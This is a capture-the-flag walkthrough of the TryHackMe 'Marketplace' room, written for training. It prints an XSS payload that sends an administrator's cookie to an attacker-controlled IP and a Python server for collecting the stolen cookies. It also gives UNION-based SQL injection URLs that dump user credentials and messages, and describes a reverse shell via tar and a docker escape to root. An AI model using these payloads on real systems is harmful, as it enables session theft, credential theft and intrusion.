# TryHackMe (Marketplace)

## Challenge: 
![chall desc](img/marketplace/chall%20desc.png)

## Solution: 
This challenge requires us to use XSS to obtain the administrator's cookie, use SQLi to obtain Jack's credentials. Afterwards, we need to move laterally to Michael's account and escape the docker container to obtain root.

To start off, we ran Threader3000 and subsequently nmap on the open ports. We got the following results.

![nmap results](img/marketplace/nmap%20results.png)

This shows that SSH, port 80 and port 32768 were open.

Heading to port 80, we saw a marketplace website.

![marketplace site](img/marketplace/website%20port%2080.png)

Using dirsearch for directory enumeration, we found the following directories.

![found directories](img/marketplace/dirsearch%20admin%20page.png)

Knowing that the admin directory exists, we headed over to that directory.

![admin page unauthorized](img/marketplace/unauthorized%20admin.png)

As seen from the figure above, we are unable to go to the admin page due to the lack of authorization.

Next, we decided to sign up and login to the account we just created. 

![logged in](img/marketplace/logged%20in.png)

After logging in, we were able to create a new listing. We decided to test whether XSS vulnerability is present in the listing title field.

![test xss](img/marketplace/new%20listing.png)

With that, we were able to see that the title was indeed *italicised*

![xss is present](img/marketplace/vuln%20to%20xss.png)

Knowing that it is vulnerable to XSS, we could use the XSS cookie stealer payload `<script>var i=new Image;i.src="http://10.11.67.208:8888/?"+document.cookie;</script>` and set up a [server](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) using the following script on the attacking machine.

```
#!/usr/bin/env python
# POC for cookie stealing through XSS
# Should work with:
# <script>
#   image = new Image();
#   image.src='http://X.X.X.X:8888/?'+document.cookie;
# </script>

# Written by Ahmed Shawky @lnxg33k

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import urlparse, parse_qs
from datetime import datetime


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        print ""
        print "%s - %s\t%s" % (
            datetime.now().strftime("%Y-%m-%d %I:%M %p"),
            self.client_address[0],
            self.headers['user-agent'])
        print "-------------------"*6
        for k, v in query_components.items():
            print "%s\t\t\t%s" % (k.strip(), v)

        # print query_components
        # self.send_response(500)

        # self.send_header("Content-type", "text/html")
        # self.end_headers()
        # self.wfile.write(c)

        return

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    try:
        server = HTTPServer(('0.0.0.0', 8888), MyHandler)
        print('Started http server')
        server.serve_forever()
    except KeyboardInterrupt:
        print('^C received, shutting down server')
        server.socket.close()
```

![xss script on attacker server](img/marketplace/started%20cookie%20stealing%20server.png)

Afterwards, we used the report listing to admin functionality to allow the admin to view the XSS infected page.

![report listing](img/marketplace/report%20listing.png)

Shortly after, we received messages that the admin has reviewed the page that we submitted.

![report listing results](img/marketplace/reported%20listing%20results.png)

Heading over to our XSS cookie-stealing server, we found that the administrator cookie was being logged.

![admin cookie found](img/marketplace/able%20to%20receive%20the%20admin%20cookie.png)

Using the newly found admin cookie, we were able to visit the `admin` directory, obtaining flag 1.

![obtained flag1](img/marketplace/flag%201.png)

Clicking on the user's messages, we were brought to this page.

![admin directory](img/marketplace/looks%20sqli.png)

The GET parameter seems like a SQL injectable field. Adding a single quote as the payload, we obtained the following results.

![single quote payload](img/marketplace/sqli%20found.png)

This confirmed that the USER field is indeed susceptible to SQLi. Thus, we tried using manual SQLi to dump the database.

Firstly, we need to determine the number of columns present by continuously incrementing the number of columns until no error is shown.

![wrong col no](img/marketplace/wrong%20col%20no.png)

We know that 4 columns are present by using the payload `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,2,3,4`

![4 col](img/marketplace/col%204%20is%20correct.png)

Next, we needed to show the database that was present.

Payload: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,database(),3,4`

![dump db](img/marketplace/db%20shown.png)

Knowing that the database is marketplace, we decided to dump the tables present.

Payload: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27`

![dump tables](img/marketplace/show%20tables.png)

We then tried to go to the `users` table to obtain the credentials.

Payload: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27`

![dump columns](img/marketplace/columns%20in%20users%20table.png)

Dumping the usernames and passwords columns in the users table, we obtained the following credentials.

Payload: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(username,%22:%22,password,%20%22:%22,%20isAdministrator,%20%22\n%22),3,4%20FROM%20users`

![dump columns](img/marketplace/hashes%20dumped.png)

Next, we tried to crack the hashes but were unable to do so.

![tried but failed](img/marketplace/tried%20brute%20force%20but%20failed.png)

> Tip: When in doubt, enumerate harder!

Remember the `messages` table in the `marketplace` database? We decided to revisit it and dump the contents in it.

To find the columns present: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%20%27messages%27`

![col present](img/marketplace/go%20to%20messages.png)

Now, we will dump the contents present in the message database.

To dump the contents: `http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(id,%20%27:%27,user_from,%20%27:%27,user_to,%20%27:%27,message_content,%20%27:%27,is_read,%20%27:%27,%20%27\n%27%20),3,4%20FROM%20messages`

![obtained msg](img/marketplace/messages%20contain%20password.png)

The dumped message showed that a SSH password. The message was addressed to user 3, which was Jack.

![found jack](img/marketplace/user%203%20is%20jake.png)

Using the newly found credentials, we managed to log in to Jake's account and obtained `user.txt`.

![obtained flag 2](img/marketplace/flag%202.png)

Next, we found that jake is able to run `/opt/backup/backup.sh` with Michael's privileges.

![possible priv esc](img/marketplace/possible%20priv%20esc.png)

Checking the `backup.sh` file, we found the following.

![backup sh](img/marketplace/backup%20sh%20file.png)

This allowed us to use tar to move laterally to Michael's account.

To exploit tar, we first must create a nc reverse shell payload using msfvenom.

![netcat rev shell payload](img/marketplace/netcat%20rev%20shell%20payload.png)

Afterwards, we needed to put in the payload to `shell.sh` and set some parameters for it.

![create shell sh](img/marketplace/create%20shell%20sh.png)

Next, we ran the tar command as Michael using `sudo -u michael /opt/backups/backup.sh`. This allowed us to obtain a reverse shell for the Michael user.

![obtained michael rev shell](img/marketplace/received%20michael%20rev%20shell.png)

Using the `id` command, we could see that michael is part of the docker group.

![id command](img/marketplace/docker%20container%20is%20present.png)

Heading to GTFObins docker section ![docker esc](img/marketplace/gtfo%20bins%20docker%20esc.png)

With that, we used `docker images` to check the docker images that were present on the system. We found that there was a `alpine` image and decided to run it. We managed to obtain `root.txt`! :)

![flag 3](img/marketplace/flag%203.png)